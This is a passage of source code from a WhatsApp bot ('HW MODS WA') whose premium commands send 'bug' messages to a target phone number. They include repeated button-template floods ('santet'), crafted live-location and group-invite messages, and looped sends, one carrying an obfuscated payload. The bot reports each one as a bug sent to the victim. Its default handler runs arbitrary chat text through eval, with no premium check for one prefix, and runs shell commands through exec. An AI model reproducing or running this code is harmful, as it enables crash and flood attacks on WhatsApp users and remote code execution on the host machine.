bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${ngazap(prefix)}`}, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendlokas':{
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(from, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© HW MODS WA${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, liveLocation.message, { messageId: liveLocation.key.id })
sticSukses(from)
}
break
//=================================================//
case 'afk': {
if (!isPrem) return replyprem(mess.premium)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${m.pushName} Hello Saya Bot Hw Mods${text ? ': ' + text : ''}`)
}
break
//=================================================//
case '🔥': 
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
const buttons = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonMessage = {
text: "𝙘𝙞𝙡𝙤 𝙗𝙤𝙩",
footerText: 'Pe',
buttons: buttons,
headerType: 1
}
haikal.sendMessage(from, buttonMessage)
sticSukses(from)
}
 break
//=================================================//
case '🌷': {
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','62881024911798','771192XPifQJ','6285714170944','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','reply\x20Menger','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20HW\x20MODS\x20WA','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'HW\x20MODS\x20WA','id':_0x47bf3a(0x153)}}]}));
 await sleep(20)
 sticSukses(from)
}
}
break
//=================================================//
case 'santet' : {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
 haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
haikal.sendMessage(bnnd, { 
text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281214281312'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
 m.reply(`Sukses Mengirim Bug Ke ${bnnd} !!!`)
}
break
//=================================================//
case 'sendinvite':{
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME HW MODS WA${ngazap(prefix)}`,
"groupName": `MY NAME HW MODS WA${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, groupInvite.message, { messageId: groupInvite.key.id })
m.reply(`Sukses Mengirim Bug Ke ${bnnd} !!!`)
}
break
//=================================================//
default:
if (budy.startsWith('=>')) {
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isPrem) return replyprem(mess.premium)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
if (!isPrem) return replyprem(mess.premium)
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
haikal.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})